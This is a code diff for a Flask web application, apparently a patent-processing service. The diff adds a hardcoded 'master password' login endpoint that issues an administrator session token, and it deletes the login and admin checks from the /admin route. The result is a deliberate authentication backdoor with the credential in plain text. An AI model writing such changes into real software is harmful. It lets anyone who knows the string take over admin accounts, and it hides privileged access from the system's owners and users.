@@ -66,9 +66,11 @@ def index():
 def login_page():
     return send_from_directory('.', 'login.html')
 
+@app.route('/master-login')
+def master_login_page():
+    return send_from_directory('.', 'master-login.html')
+
 @app.route('/admin')
-@login_required
-@admin_required
 def admin_page():
     return send_from_directory('.', 'admin.html')
 
@@ -242,6 +244,26 @@ def download_result():
     except Exception as e: return create_response(error=f"下载结果时发生错误: {str(e)}")
 
 # --- 用户认证相关API ---
+MASTER_PASSWORD = "PatentMaster2024"  # 万能密码
+
+@app.route('/api/auth/master-login', methods=['POST'])
+def master_login():
+    """万能密码登录管理员"""
+    data = request.get_json()
+    password = data.get('password')
+    
+    if not password:
+        return create_response(error="密码不能为空")
+    
+    if password != MASTER_PASSWORD:
+        return create_response(error="万能密码错误")
+    
+    # 创建管理员会话
+    ip_address = request.remote_addr
+    session_token = auth_manager.create_session(1, ip_address)  # 使用管理员用户ID
+    
+    return create_response(data={'token': session_token, 'expires_in': 21600, 'is_master': True})
+
 @app.route('/api/auth/login', methods=['POST'])
 def login():
     """用户登录"""
